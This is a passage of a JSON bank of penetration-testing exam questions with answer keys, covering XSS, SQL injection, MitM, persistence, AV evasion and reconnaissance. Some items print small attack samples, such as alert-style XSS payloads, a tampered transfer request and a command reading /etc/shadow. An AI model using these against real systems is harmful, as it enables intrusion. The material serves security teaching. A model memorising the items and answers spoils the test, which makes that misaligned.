              "Using a combination of automated web application vulnerability scanners (e.g., Burp Suite, OWASP ZAP, Nikto), manual testing techniques (e.g., input validation testing, session management testing, authentication testing, business logic testing, parameter tampering), and, if available, source code review.",
              "Phishing.",
              "Social engineering."
           ],
           "correctAnswerIndex": 1,
           "explanation": "A comprehensive web application security assessment involves both automated scanning (for broad coverage and identification of common vulnerabilities) and manual testing (for deeper analysis, finding logic flaws, and testing complex attack scenarios). Code review, when possible, provides the most in-depth analysis. Shoulder surfing, phishing, and social engineering are different reconnaissance or attack techniques.",
           "examTip": "Automated scanners + manual testing + code review = Comprehensive web application security assessment."
        },
        {
           "id": 37,
            "question": "What is the primary purpose of 'output encoding' in web application security?",
            "options":[
                "To make web pages load faster.",
                "To prevent cross-site scripting (XSS) attacks by converting special characters (like <, >, &, \", ') into their corresponding HTML entities (or the appropriate encoding for the context, such as JavaScript encoding or URL encoding), ensuring that user-supplied data is treated as *data* and not as executable code.",
                "To encrypt user passwords before storing them in a database.",
                "To improve the visual design and user interface of a website."
            ],
            "correctAnswerIndex": 1,
            "explanation": "Output encoding is a critical defense against XSS. It ensures that any data displayed to the user, especially data that originated from user input, is treated as *data* and not as executable code by the browser.  It's not primarily about website speed, password encryption, or visual design.",
            "examTip": "Output encoding = Preventing XSS by sanitizing output (converting special characters)."
        },
        {
           "id": 38,
            "question": "You are performing a penetration test and discover a web application that is vulnerable to SQL injection. What is the MOST likely impact of this vulnerability?",
            "options":[
              "An attacker can inject malicious scripts into web pages viewed by other users.",
              "An attacker can gain unauthorized access to, modify, or delete data in the application's database, potentially compromising the entire application and its data.",
              "An attacker can force an authenticated user to execute unwanted actions on the web application.",
              "An attacker can make the web application unavailable to legitimate users."
            ],
            "correctAnswerIndex": 1,
            "explanation": "SQL injection directly targets the database. A successful attack can allow an attacker to bypass authentication, read sensitive data, modify data, or even execute commands on the database server. Injecting scripts is XSS, forcing unintended actions is CSRF, and making the application unavailable is DoS.",
            "examTip": "SQL injection = Unauthorized database access, modification, or deletion."
        },
        {
            "id": 39,
             "question": "Which of the following is a common technique used in 'phishing' attacks?",
             "options":[
                "Exploiting a vulnerability in a web server's operating system.",
                "Sending deceptive emails, messages, or creating fake websites that appear to be from a legitimate and trustworthy source, with the goal of tricking the recipient into revealing sensitive information (like usernames, passwords, credit card details), clicking on malicious links, or opening malicious attachments.",
                "Scanning a network for open ports and services.",
                "Cracking passwords using a brute-force or dictionary attack."
             ],
             "correctAnswerIndex": 1,
             "explanation": "Phishing is a social engineering attack that relies on deception and trickery. It doesn't directly involve exploiting OS vulnerabilities, port scanning, or password cracking (though those might be *subsequent* steps after a successful phishing attack).",
             "examTip": "Phishing = Deceptive emails/messages to steal information or deliver malware."
        },
        {
          "id": 40,
          "question": "Analyze the following snippet of JavaScript code, often found within web applications:\n```javascript\nfunction showImage(imageUrl) {\n  document.getElementById('imageContainer').innerHTML = '<img src=\"' + imageUrl + '\"/>';\n}\n```\nIf the `imageUrl` variable is taken directly from user input without proper sanitization or encoding, what type of vulnerability is MOST likely present, and why?",
          "options":[
             "SQL Injection, because the `imageUrl` variable could contain malicious SQL code.",
             "Cross-Site Scripting (XSS), because an attacker could inject malicious JavaScript code into the `imageUrl` parameter, which would then be executed in the context of the user's browser.",
             "Cross-Site Request Forgery (CSRF), because the `imageUrl` variable could be used to force the user to perform unintended actions.",
             "Denial-of-Service (DoS), because the `imageUrl` variable could point to a very large image, causing the browser to crash."
          ],
          "correctAnswerIndex": 1,
          "explanation": "This code is vulnerable to Cross-Site Scripting (XSS). The `imageUrl` variable is directly inserted into the `innerHTML` of the `imageContainer` element. If an attacker provides a malicious value for `imageUrl` (e.g., `'\" onerror=\"alert('XSS')\"'`), the resulting HTML would be `<img src="" onerror="alert('XSS')"/>`, which would execute the attacker's JavaScript code. This is *not* SQL injection (no database interaction), CSRF (no forced user actions), or DoS (though a very large image *could* cause performance issues, that's not the primary vulnerability here).",
          "examTip": "Directly inserting user input into `innerHTML` = High risk of XSS."
        },
        {
            "id": 41,
            "question":"What is 'privilege escalation'?",
            "options":[
               "Encrypting sensitive data on a system to protect it from unauthorized access.",
               "The process of gaining higher-level permissions or access rights than initially granted or intended, often by exploiting vulnerabilities, misconfigurations, or design flaws in a system or application.",
               "Scanning a network for open ports and services to identify potential attack vectors.",
               "Sending phishing emails to users to obtain their credentials or trick them into installing malware."
            ],
            "correctAnswerIndex": 1,
            "explanation": "Privilege escalation is about obtaining greater access rights than originally intended, typically by exploiting system weaknesses. It's not encryption, port scanning, or phishing (though phishing could be used to *gain initial access*, which might then be followed by privilege escalation).",
            "examTip": "Privilege escalation = Gaining higher access rights (often from user to administrator/root)."
        },
        {
           "id": 42,
           "question": "Which of the following is a common method for performing a 'man-in-the-middle' (MitM) attack?",
           "options":[
                "Sending phishing emails to a large number of recipients.",
                "Using techniques like ARP poisoning (on wired networks), creating a rogue access point (evil twin) on wireless networks, DNS spoofing, or exploiting vulnerabilities in network protocols to intercept, monitor, and potentially modify network traffic between two parties.",
                "Exploiting a vulnerability in a web application to inject malicious SQL code.",
                "Cracking passwords using a brute-force or dictionary attack."
           ],
           "correctAnswerIndex": 1,
           "explanation": "MitM attacks involve intercepting communication. ARP poisoning redirects traffic on wired networks, rogue access points (evil twins) do the same on wireless networks, and DNS spoofing redirects DNS requests. Protocol vulnerabilities can also be exploited. Phishing is social engineering, SQL injection targets databases, and password cracking targets passwords.",
           "examTip": "ARP poisoning (wired), rogue AP (wireless), DNS spoofing, protocol exploits = MitM techniques."
        },
        {
          "id": 43,
           "question": "What is the primary purpose of using a 'Web Application Firewall' (WAF) in front of a web application?",
           "options":[
            "To encrypt all data stored on the web server's file system.",
            "To filter, monitor, and block malicious HTTP/HTTPS traffic to and from the web application, providing a layer of defense against common web attacks like SQL injection, cross-site scripting (XSS), and others.  WAFs often use rule sets, signatures, and anomaly detection to identify and block attack attempts.",
            "To manage user accounts, permissions, and authentication for the web application.",
            "To improve the performance, speed, and scalability of the web application."
           ],
           "correctAnswerIndex": 1,
           "explanation": "A WAF acts as a security guard for web applications, analyzing traffic and blocking malicious requests based on predefined rules, signatures, and anomaly detection. While some WAFs may handle SSL/TLS termination, their primary function is *not* simply encryption. User management and performance optimization are separate concerns (though a WAF *can* sometimes improve performance through caching).",
           "examTip": "WAF = Web application protection (filtering malicious traffic)."
        },
        {
            "id": 44,
            "question": "Which of the following is a common method for gathering information about a target organization's DNS infrastructure during the reconnaissance phase of a penetration test?",
            "options":[
               "Exploiting vulnerabilities in the target's web server.",
                "Attempting DNS zone transfers (if the DNS server is misconfigured to allow them), using tools like `dig` and `nslookup` to query DNS records, performing subdomain enumeration, and using online DNS lookup tools and services.",
               "Performing a denial-of-service attack against the target's network.",
               "Cracking passwords using a brute-force or dictionary attack."
            ],
            "correctAnswerIndex": 1,
            "explanation": "DNS reconnaissance involves gathering information about the target's DNS records, which can reveal valuable information about their network infrastructure, servers, and services. Zone transfers (if permitted) provide a complete list of DNS records. `dig` and `nslookup` are used for querying DNS servers. Subdomain enumeration helps find hidden subdomains. Exploiting web servers, DoS attacks, and password cracking are different attack techniques.",
            "examTip": "DNS zone transfers, `dig`, `nslookup`, subdomain enumeration = DNS reconnaissance."
        },
        {
            "id": 45,
            "question": "What is the primary purpose of 'output encoding' in the context of web application security?",
            "options":[
               "To make web pages load faster by compressing the output.",
                "To prevent cross-site scripting (XSS) attacks by converting special characters (like <, >, &, \", ') into their corresponding HTML entities (or the appropriate encoding for the context, such as JavaScript encoding or URL encoding). This ensures that user-supplied data is treated as *data* and not as executable code by the web browser.",
                "To encrypt user passwords before storing them in a database.",
                "To improve the visual design and user interface of a web application."
            ],
            "correctAnswerIndex": 1,
            "explanation": "Output encoding is a crucial defense against XSS. It ensures that any data displayed to the user, especially data originating from user input, is treated as *data* and not as executable code by the browser, preventing the injection of malicious scripts. It's not primarily about website speed, password encryption, or visual design.",
            "examTip": "Output encoding = Preventing XSS by sanitizing output (converting special characters)."
        },
        {
            "id": 46,
            "question": "Which of the following BEST describes 'lateral movement' within a compromised network?",
            "options":[
              "The initial compromise of a target system, often through phishing, vulnerability exploitation, or other means.",
              "The process of moving from one compromised system to another within the target network, leveraging trust relationships, exploiting vulnerabilities in other systems, or using stolen credentials to expand access and control.",
              "The exfiltration of sensitive data from the target network to a location under the attacker's control.",
              "The escalation of privileges on a single compromised system to gain higher-level access rights."
            ],
            "correctAnswerIndex": 1,
            "explanation": "Lateral movement is about expanding access *within* the network *after* gaining an initial foothold. It involves pivoting from one compromised system to others. The initial compromise is the entry point. Data exfiltration is often a later goal, and privilege escalation is on a single system.",
            "examTip": "Lateral movement = Expanding access within a network (pivoting)."
        },
         {
          "id": 47,
          "question": "You are conducting a penetration test and successfully exploit a vulnerability that allows you to execute arbitrary commands on a target system. What is the common term for this type of vulnerability?",
          "options":[
            "Cross-Site Scripting (XSS)",
            "Remote Code Execution (RCE)",
            "SQL Injection (SQLi)",
            "Denial-of-Service (DoS)"
          ],
          "correctAnswerIndex": 1,
          "explanation": "Remote Code Execution (RCE) is a critical vulnerability that allows an attacker to execute arbitrary commands on the target system. XSS involves injecting client-side scripts, SQLi targets databases, and DoS disrupts service availability.",
          "examTip": "Remote Code Execution (RCE) = Executing arbitrary commands on a target system."
        },
        {
            "id": 48,
            "question": "Which of the following is a common technique used to bypass firewalls and gain access to internal networks?",
            "options":[
              "Using strong passwords for all user accounts.",
              "Tunneling malicious traffic through commonly allowed ports (e.g., port 80, 443) or using protocols that are typically permitted (e.g., DNS tunneling, ICMP tunneling), exploiting vulnerabilities in firewall software, or using compromised systems as pivot points.",
              "Enabling two-factor authentication for all user accounts.",
              "Regularly updating the operating system and all installed software."
            ],
            "correctAnswerIndex": 1,
            "explanation": "Tunneling involves encapsulating malicious traffic within legitimate-looking traffic that is allowed through the firewall. Exploiting firewall vulnerabilities or using compromised systems as pivots are also methods. Strong passwords, 2FA, and updates are good security practices, but they don't directly address firewall bypass.",
            "examTip": "Tunneling, firewall exploits, pivoting = Firewall bypass techniques."
        },
        {
            "id": 49,
            "question": "What is a common method for performing a 'man-in-the-middle' (MitM) attack on a *wired* network?",
            "options":[
               "Sending phishing emails to users.",
               "ARP poisoning (ARP spoofing), which involves sending forged ARP messages to associate the attacker's MAC address with the IP address of another host (e.g., the default gateway), causing network traffic to be redirected through the attacker's machine.",
               "Exploiting a vulnerability in a web application to inject malicious SQL code.",
               "Cracking passwords using a brute-force or dictionary attack."
            ],
            "correctAnswerIndex": 1,
            "explanation": "ARP poisoning is a classic MitM technique on wired networks. It manipulates the Address Resolution Protocol (ARP) to redirect traffic. Phishing is a social engineering technique, SQL injection targets databases, and brute-force/dictionary attacks target passwords.",
            "examTip": "ARP poisoning = MitM on wired networks."
        },
        {
          "id": 50,
          "question": "Examine the following Linux command and its output:\nCommand: `cat /etc/shadow`\n(Assuming you are running this command as a non-root user)\nOutput: `cat: /etc/shadow: Permission denied`\nWhat does this output indicate, and why is it significant in terms of security?",
          "options":[
            "The `/etc/shadow` file does not exist on the system.",
            "The `/etc/shadow` file is empty.",
            "The `/etc/shadow` file, which contains the password hashes for user accounts, is properly protected and cannot be accessed by non-privileged users.",
            "The user has successfully viewed the contents of the `/etc/shadow` file."
          ],
          "correctAnswerIndex": 2,
          "explanation": "The `/etc/shadow` file stores password hashes on Linux systems.  It is *intentionally* protected with strict permissions so that only the root user can read it. The `Permission denied` message indicates that the current user (who is *not* root) does *not* have permission to access the file, which is the expected and secure behavior. If a non-root user *could* read this file, it would be a major security vulnerability.",
          "examTip": "`/etc/shadow` should only be readable by root (Permission denied for others is good!)."
        },
        {
          "id": 51,
          "question": "What is 'watering hole' attack?",
          "options":[
             "A type of denial of service attack.",
             "A targeted attack strategy where the attacker compromises a website or online resource that is frequently visited by a *specific* group or organization, with the goal of infecting the computers of those visitors with malware.",
             "A method used for encrypting data",
             "A type of social engineering attack"
          ],
          "correctAnswerIndex": 1,
          "explanation": "A watering hole attack is a targeted attack where the attacker infects a website or online resource frequented by a specific group, hoping to compromise members of that group when they visit the infected site. The attack is named after predators who wait at watering holes to ambush their prey.",
          "examTip": "Watering hole = Compromising a website to target a specific group of users."
        },
        {
           "id": 52,
          "question": "Which of the following is a common technique used to bypass antivirus (AV) software?",
          "options":[
            "Using well-known and easily detectable malware signatures.",
            "Using techniques like packers, crypters, polymorphism, code obfuscation, and process injection to alter the appearance and behavior of malware, making it harder for AV to detect.",
            "Keeping the antivirus software up-to-date with the latest signature definitions.",
            "Using the default configuration settings for the antivirus software."
          ],
          "correctAnswerIndex": 1,
          "explanation": "Attackers constantly try to evade AV detection. Packers and crypters compress or encrypt the malware, polymorphism changes the malware's code on each infection, obfuscation makes the code harder to understand, and process injection hides malicious code within legitimate processes. Using known signatures, up-to-date AV, and default settings would *help* the AV, not evade it.",
          "examTip": "Packers, crypters, polymorphism, obfuscation, process injection = AV evasion."
        },
        {
          "id": 53,
          "question": "What is a common method for discovering and exploiting vulnerabilities in web applications?",
          "options":[
            "Shoulder surfing.",
            "Using a combination of automated web application vulnerability scanners (like Burp Suite, OWASP ZAP, Nikto), manual testing techniques (including input validation testing, session management testing, authentication testing, business logic testing, and parameter tampering), and, if available, source code review.",
            "Phishing.",
            "Social engineering."
          ],
          "correctAnswerIndex": 1,
          "explanation": "A comprehensive web application security assessment requires both automated scanning (for broad coverage and identifying common vulnerabilities) and manual testing (for in-depth analysis, finding logic flaws, and testing complex attack scenarios). Source code review, when possible, provides the deepest level of analysis. Shoulder surfing, phishing, and social engineering are different reconnaissance or attack techniques.",
          "examTip": "Automated scanners + manual testing + code review = Comprehensive web application security assessment."
        },
        {
            "id": 54,
            "question": "What is 'business logic vulnerability'?",
            "options":[
                "A vulnerability in the operating system of a web server.",
                "A flaw in the design or implementation of an application's *intended* functionality and business rules that allows an attacker to perform actions that violate those rules or achieve unintended and potentially malicious outcomes.",
                "A vulnerability in a network firewall that allows unauthorized network traffic.",
                "A type of social engineering attack that targets business executives."
            ],
            "correctAnswerIndex": 1,
            "explanation": "Business logic vulnerabilities are flaws in *how* the application is *supposed* to work, according to its business requirements. They are not necessarily traditional technical vulnerabilities (like buffer overflows or SQL injection), but rather mistakes in the application's design or logic. They are specific to the application's intended purpose and rules.",
            "examTip": "Business logic vulnerability = Exploiting flaws in the application's *intended* functionality."
        },
        {
          "id": 55,
          "question":"Which of the following is a common technique used to discover hidden parameters or functionality in web applications?",
          "options":[
            "Shoulder surfing.",
            "Using tools like Burp Suite's Intruder and Repeater, Param Miner, Arjun, or manual analysis of requests, responses, JavaScript code, and HTML source; also trying common parameter names and values, and fuzzing.",
            "Phishing.",
            "Social engineering."
          ],
          "correctAnswerIndex": 1,
          "explanation": "Hidden parameters are not always visible in the user interface or easily discoverable through normal browsing. Specialized tools, manual analysis of the application's behavior, and fuzzing techniques are often required to find them. Shoulder surfing, phishing, and social engineering are different reconnaissance or attack techniques.",
          "examTip": "Parameter tampering, specialized tools, request/response analysis = Discovering hidden web app parameters."
        },
        {
           "id": 56,
           "question": "What is the primary purpose of a 'penetration testing methodology' (such as PTES, OSSTMM, or NIST SP 800-115)?",
           "options":[
             "To provide a list of all known vulnerabilities that exist in software and hardware.",
             "To provide a structured, repeatable, and comprehensive framework for conducting penetration tests, ensuring consistency, thoroughness, ethical conduct, and legal compliance.",
             "To guarantee that a penetration test will find all security flaws in a target system.",
             "To replace the need for skilled and experienced penetration testers."
           ],
           "correctAnswerIndex": 1,
           "explanation": "Penetration testing methodologies provide a roadmap and best practices for conducting ethical hacking engagements. They promote consistency, thoroughness, and ethical behavior. They are not exhaustive vulnerability lists, guarantees of complete success, or replacements for skilled testers.",
           "examTip": "Penetration testing methodology = Structured framework for ethical hacking."
        },
        {
            "id": 57,
             "question": "Which of the following is a common method for performing a 'denial-of-service' (DoS) or 'distributed denial-of-service' (DDoS) attack?",
             "options":[
                "Sending phishing emails to a large number of recipients.",
                "Flooding a target system or network with traffic (e.g., SYN floods, UDP floods, HTTP floods), consuming resources (e.g., bandwidth, CPU, memory), exploiting vulnerabilities that cause the service to crash or become unresponsive, or using amplification techniques (e.g., DNS amplification, NTP amplification).",
                "Exploiting a vulnerability in a web application to inject malicious SQL code.",
                "Cracking passwords using a brute-force or dictionary attack."
             ],
             "correctAnswerIndex": 1,
             "explanation": "DoS/DDoS attacks aim to disrupt service availability. Flooding is a common method, but resource exhaustion, exploiting vulnerabilities to cause crashes, and amplification techniques are also used. Phishing is a social engineering technique, SQL injection targets databases, and brute-force/dictionary attacks target passwords.",
             "examTip": "DoS/DDoS = Disrupting service availability (flooding, resource exhaustion, crashes, amplification)."
        },
        {
            "id": 58,
            "question": "What is a common technique for maintaining persistence on a compromised Windows system?",
            "options":[
              "Regularly updating the operating system and all installed software.",
              "Creating a scheduled task, modifying the registry (e.g., Run keys, RunOnce keys, Services), using WMI event subscriptions, or performing DLL hijacking.",
              "Using a strong, unique password for the administrator account.",
              "Enabling the Windows Firewall and ensuring it is properly configured."
            ],
            "correctAnswerIndex": 1,
            "explanation": "Persistence mechanisms ensure that an attacker can regain access even after reboots or user logouts. Scheduled tasks, registry modifications, malicious services, WMI event subscriptions, and DLL hijacking can all achieve this. Updating the OS, strong passwords, and firewalls are *defensive* measures.",
            "examTip": "Scheduled tasks, registry keys, services, WMI, DLL hijacking = Persistence on Windows."
        },
        {
            "id": 59,
            "question": "Which of the following Linux commands is MOST useful for searching for specific text patterns within files?",
            "options":[
               "ls -l",
               "grep -r \"pattern\" /path/to/search",
               "find / -name \"filename\"",
               "cat filename"
            ],
            "correctAnswerIndex": 1,
            "explanation": "The `grep` command is specifically designed for searching text within files. The `-r` option makes it recursive (searching through subdirectories). `ls -l` lists files and their attributes, `find` locates files based on name or other criteria, and `cat` displays the entire contents of a file.",
            "examTip": "`grep` = Search for text patterns within files (Linux)."
        },
        {
          "id": 60,
          "question": "Examine the following Burp Suite Repeater request (modified from a legitimate request) and its corresponding response:\n**Request:**\n```\nPOST /transfer.php HTTP/1.1\nHost: example.com\nCookie: sessionid=12345\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 56\n\nfrom_account=1001&to_account=9999&amount=1000000&csrf_token=xyz\n```\n**Response:**\n```\nHTTP/1.1 200 OK\nContent-Type: text/html; charset=UTF-8\n\nTransfer successful.\n```\nWhat type of attack was LIKELY attempted, and was it successful based on the response?",
          "options":[
             "Cross-Site Scripting (XSS) attack; unsuccessful.",
             "Parameter tampering attack (potentially targeting a business logic flaw); successful.",
             "SQL Injection attack; successful.",
             "Denial-of-Service (DoS) attack; unsuccessful."
          ],
          "correctAnswerIndex": 1,
          "explanation": "The attacker has modified the `to_account` and `amount` parameters in the POST request, likely attempting to transfer a large amount of money to an attacker-controlled account. The `csrf_token` is present, but we don't know if it's being *validated* correctly on the server-side. The `200 OK` response and the 'Transfer successful' message strongly suggest that the attack *was* successful, indicating a business logic flaw or insufficient authorization checks on the server. This is parameter tampering, a broad category that can encompass many attacks depending on the specific context. It's *not* XSS (no script injection), SQLi (no SQL code injection), or DoS (no disruption of service).",
          "examTip": "Modifying parameters and receiving a 200 OK = Potential parameter tampering/business logic flaw."
        },
        {
            "id": 61,
            "question": "What is 'DLL hijacking'?",
            "options":[
              "A social engineering technique that involves tricking a user into revealing their DLL files.",
              "An attack where a malicious DLL (Dynamic Link Library) is placed in a location where it will be loaded by a legitimate application *instead of* the intended DLL, often exploiting the DLL search order or weak application permissions, allowing the attacker's code to execute with the privileges of that application.",
              "A method for encrypting data that is stored within DLL files on a Windows system.",
              "A technique for improving the performance of DLL files and the applications that use them."
            ],
            "correctAnswerIndex": 1,
            "explanation": "DLL hijacking is a code injection technique, *not* a social engineering attack. It exploits the way Windows applications load DLLs, tricking them into loading a malicious DLL instead of the legitimate one. It's not about encryption or performance optimization.",
            "examTip": "DLL hijacking = Tricking an application into loading a malicious DLL (often exploiting search order)."
        },
        {
          "id": 62,
            "question":"Which of the following is a common technique used to discover hidden files and directories on a web server during the reconnaissance phase?",
            "options":[
                "Shoulder surfing.",
                "Using tools like DirBuster, Gobuster, ffuf, or performing directory brute-forcing/dictionary attacks; analyzing the web application's source code (HTML, JavaScript) and `robots.txt` for clues; and checking for common file and directory names.",
                "Phishing.",
                "Social engineering."
            ],
            "correctAnswerIndex": 1,
            "explanation": "Directory brute-forcing/dictionary attacks use automated tools to try many common file and directory names, attempting to find resources that are not linked from the main website. Analyzing source code and checking `robots.txt` can also reveal hidden content. Shoulder surfing, phishing, and social engineering are different reconnaissance or attack techniques.",
            "examTip": "Directory brute-forcing, source code analysis, `robots.txt` = Finding hidden web content."
        },
         {
           "id": 63,
            "question": "You are performing a wireless penetration test and successfully capture a WPA2 4-way handshake. What is the NEXT step you would typically take to try and gain access to the network?",
            "options":[
              "Immediately connect to the network using the captured handshake; no further steps are needed.",
              "Perform an offline dictionary attack or brute-force attack against the captured handshake using tools like Aircrack-ng or Hashcat, attempting to crack the Pre-Shared Key (PSK).",
              "Perform a denial-of-service (DoS) attack against the wireless access point.",
              "Send phishing emails to users on the network in an attempt to steal their credentials."
            ],
            "correctAnswerIndex": 1,
            "explanation": "The 4-way handshake contains the encrypted information needed to derive the Wi-Fi password (PSK). However, you cannot *directly* connect with just the handshake. You need to perform an *offline* attack (dictionary or brute-force) to try and *crack* the password. DoS attacks and phishing are unrelated to cracking the WPA2 PSK.",
            "examTip": "WPA2 4-way handshake capture = Next step is offline password cracking (dictionary/brute-force)."
        },
        {
            "id": 64,
            "question": "What is the primary purpose of a 'Web Application Firewall' (WAF)?",
            "options":[
               "To encrypt all data stored on the web server's file system.",
               "To filter, monitor, and block malicious HTTP/HTTPS traffic to and from a web application, providing a layer of defense against common web attacks like SQL injection, cross-site scripting (XSS), and others. WAFs often use rule sets, signatures, anomaly detection, and behavioral analysis to identify and block attack attempts.",
               "To manage user accounts, permissions, and authentication for the web application.",
               "To improve the performance, speed, and scalability of the web application."
            ],
            "correctAnswerIndex": 1,
            "explanation": "A WAF acts as a security guard for web applications, analyzing traffic and blocking malicious requests based on predefined rules, signatures, and other security mechanisms. While some WAFs may handle SSL/TLS termination, their primary function is *not* simply encryption. User management and performance optimization are separate concerns (though a WAF *can* sometimes improve performance through caching).",
            "examTip": "WAF = Web application protection (filtering malicious traffic based on rules/signatures)."
        },
        {
            "id": 65,
           "question": "You are performing a penetration test and discover a web application that echoes back user-supplied input without proper sanitization or encoding.  For example, if you enter `<script>alert(1)</script>` in a search box, the JavaScript code executes. What type of vulnerability have you found, and what is a potential consequence?",
           "options":[
              "SQL Injection; you could gain access to the application's database.",
              "Cross-Site Scripting (XSS); you could inject malicious scripts that are executed in the browsers of other users who visit the affected page.",
              "Cross-Site Request Forgery (CSRF); you could force an authenticated user to perform unintended actions.",
              "Denial-of-Service (DoS); you could make the web application unavailable."
           ],
           "correctAnswerIndex": 1,
           "explanation": "The direct execution of injected JavaScript code (`<script>alert(1)</script>`) is a clear indication of Cross-Site Scripting (XSS).  This allows an attacker to run arbitrary scripts in the context of other users' browsers, potentially stealing cookies, redirecting users, defacing the site, or performing other malicious actions. It's not SQL injection (which targets databases), CSRF (which forces unintended actions through legitimate-looking requests), or DoS (which disrupts service).",
           "examTip": "User input echoed back and executed as code = XSS."
        },
        {
            "id": 66,
            "question": "Which of the following is a common technique for performing a 'man-in-the-middle' (MitM) attack?",
            "options":[
                "Sending phishing emails to a large number of recipients.",
                "Using techniques like ARP poisoning (on wired networks), creating a rogue access point (evil twin) on wireless networks, DNS spoofing, or exploiting vulnerabilities in network protocols to intercept, monitor, and potentially modify network traffic between two parties.",
                "Exploiting a vulnerability in a web application to inject malicious SQL code.",
                "Cracking passwords using a brute-force or dictionary attack."
            ],
            "correctAnswerIndex": 1,
            "explanation": "MitM attacks involve intercepting communication. ARP poisoning redirects traffic on wired networks, rogue access points (evil twins) do the same on wireless networks, and DNS spoofing redirects DNS requests. Protocol vulnerabilities can also be exploited. Phishing is a social engineering technique, SQL injection targets databases, and brute-force/dictionary attacks target passwords.",
            "examTip": "ARP poisoning (wired), rogue AP (wireless), DNS spoofing, protocol exploits = MitM techniques."
        },
         {
          "id": 67,
           "question": "What is 'LDAP injection'?",
           "options":[
            "A type of social engineering attack where an attacker impersonates an LDAP server.",
            "An attack technique used to exploit web applications (or other applications) that construct LDAP (Lightweight Directory Access Protocol) statements based on user input. Attackers can modify LDAP statements to access, modify, or retrieve information from the directory service, potentially bypassing authentication or authorization checks.",
            "A method for encrypting data transmitted over a network using the LDAP protocol.",
            "A technique for improving the performance of LDAP directory lookups."
           ],
           "correctAnswerIndex": 1,
           "explanation": "LDAP injection, similar in concept to SQL injection, targets vulnerabilities in how applications handle user input when interacting with LDAP directories. It's not a social engineering attack, an encryption method, or a performance improvement technique.",
           "examTip": "LDAP injection = Injecting malicious LDAP queries (similar to SQLi, but for LDAP)."
        },
        {
           "id": 68,
            "question": "You have gained access to a Linux system. Which of the following commands would be MOST useful for identifying the system's network interfaces, IP addresses, and MAC addresses?",
            "options":[
               "ps aux",
               "ifconfig -a (or ip addr show)",
               "netstat -tulnp",
               "ls -l /"
            ],
            "correctAnswerIndex": 1,
            "explanation": "`ifconfig -a` (or the more modern `ip addr show`) displays detailed information about all network interfaces, including IP addresses, MAC addresses, and their status (up/down). `ps aux` shows running processes, `netstat -tulnp` shows listening network ports, and `ls -l /` lists files in the root directory.",
            "examTip": "`ifconfig -a` or `ip addr show` = Network interface information (Linux)."
        },
        {
            "id": 69,
            "question": "What is the primary purpose of a 'Security Information and Event Management' (SIEM) system?",
            "options":[
               "To encrypt sensitive data stored on servers and workstations.",
               "To collect, aggregate, analyze, and correlate security event logs from various sources across a network and IT infrastructure, providing real-time monitoring, alerting, and reporting capabilities for security incidents.",
               "To perform vulnerability scans and identify security weaknesses in a system or network.",
               "To block network attacks and prevent unauthorized access to network resources."
            ],
            "correctAnswerIndex": 1,
            "explanation": "A SIEM is a central hub for security monitoring and analysis. It collects logs from various sources (firewalls, servers, applications, etc.), correlates events, and provides alerts and reporting capabilities.  It's not primarily for encryption, vulnerability scanning (though it may integrate with such tools), or directly blocking attacks (that's the role of firewalls and IPS).",
            "examTip": "SIEM = Centralized security log analysis, correlation, and alerting."
        },
        {
            "id": 70,
             "question": "Examine the following Nmap command and its (partial) output:\nCommand: `nmap -sU -p 161 192.168.1.100`\nPartial Output:\n```\nStarting Nmap 7.94 ( https://nmap.org ) at [Timestamp]\nNmap scan report for 192.168.1.100\nHost is up (0.0010s latency).\nPORT    STATE         SERVICE\n161/udp open|filtered snmp\n```\nWhat does the `open|filtered` state for port 161 indicate, and why is this significant in the context of SNMP?",
             "options":[
                "Port 161 is definitely open and running SNMP.",
                "Port 161 is definitely closed and not running SNMP.",
                "Nmap could not definitively determine whether port 161 is open or closed; it's likely that a firewall or filtering device is interfering with the scan. This is significant because SNMP (Simple Network Management Protocol) is often a target for attackers due to weak default configurations and potential for information disclosure.",
                "Port 161 is open, but the service running on it is not SNMP."
             ],
             "correctAnswerIndex": 2,
             "explanation": "`open|filtered` in Nmap means that Nmap received *no response* to its UDP probe.  This could mean the port is open, but the service isn't responding, *or* it could mean a firewall is blocking the traffic. It does *not* definitively mean open or closed.  Port 161 is the standard port for SNMP.  SNMP is often a target because many devices have weak default community strings (passwords), allowing attackers to gather information about the device or even reconfigure it.  Further investigation is needed to determine if SNMP is actually running and if it's vulnerable.",
             "examTip": "Nmap `open|filtered` (UDP) = Inconclusive; firewall or non-responsive service.  SNMP (port 161) often has weak defaults."
        },
        {
            "id": 71,
            "question": "Which of the following is a common technique for maintaining persistence on a compromised Linux system?",
            "options":[
              "Using strong passwords for all user accounts.",
              "Modifying system startup scripts (e.g., in /etc/init.d/, systemd units, or rc.local), creating cron jobs, adding a user with sudo privileges, creating a backdoor using a tool like netcat, or installing a rootkit.",
              "Enabling a firewall to block unauthorized network connections.",
              "Regularly updating the operating system and all installed software."
            ],
            "correctAnswerIndex": 1,
            "explanation": "Persistence mechanisms allow an attacker to regain access even after reboots or user logouts. Modifying startup scripts, creating cron jobs (scheduled tasks), adding a privileged user, creating backdoors and using rootkit are all common techniques. Strong passwords, firewalls, and updates are *defensive* measures.",
            "examTip": "Startup scripts, cron jobs, user accounts, backdoors, rootkits = Persistence on Linux."
        },
        {
        "id": 72,
        "question":"What is 'cross-site request forgery' (CSRF)?",
        "options":[
            "A type of denial-of-service attack that makes a web server unavailable to legitimate users.",
            "An attack that forces an authenticated end user to execute unwanted actions on a web application in which they are currently logged in, without their knowledge or consent. The attacker tricks the user's browser into sending a forged request to the vulnerable application.",
            "A method for encrypting web traffic between a client and a server using SSL/TLS.",
            "A technique for cracking passwords using a brute-force or dictionary attack."
        ],
        "correctAnswerIndex": 1,
        "explanation":"CSRF exploits the trust a web application has in a logged-in user's browser. The attacker crafts a malicious request that the user's browser unknowingly sends to the vulnerable application. The application, seeing a valid session, executes the request as if it came from the user. It's not a DoS attack, an encryption method, or a password cracking technique.",
        "examTip": "CSRF = Forcing authenticated users to execute unintended actions."
        },
        {
          "id": 73,
          "question":"What is a common method to perform reconnaissance and gather information about a target organization's employees and infrastructure?",
          "options":[
                "Exploiting vulnerabilities in the target's web server.",
                "Using OSINT (Open-Source Intelligence) techniques, such as searching public websites, social media platforms (e.g., LinkedIn), search engines, DNS records, WHOIS information, public code repositories, and other publicly available data sources; also, using specialized tools like theHarvester, Maltego, and Shodan.",
                "Performing a denial-of-service attack against the target's network.",
                "Cracking passwords using a brute-force or dictionary attack."
          ],
          "correctAnswerIndex": 1,
          "explanation": "Reconnaissance involves gathering information *before* launching any attacks. OSINT is a crucial part of this phase, leveraging publicly available data to learn about the target. Exploiting vulnerabilities, DoS attacks, and password cracking are later attack stages.",
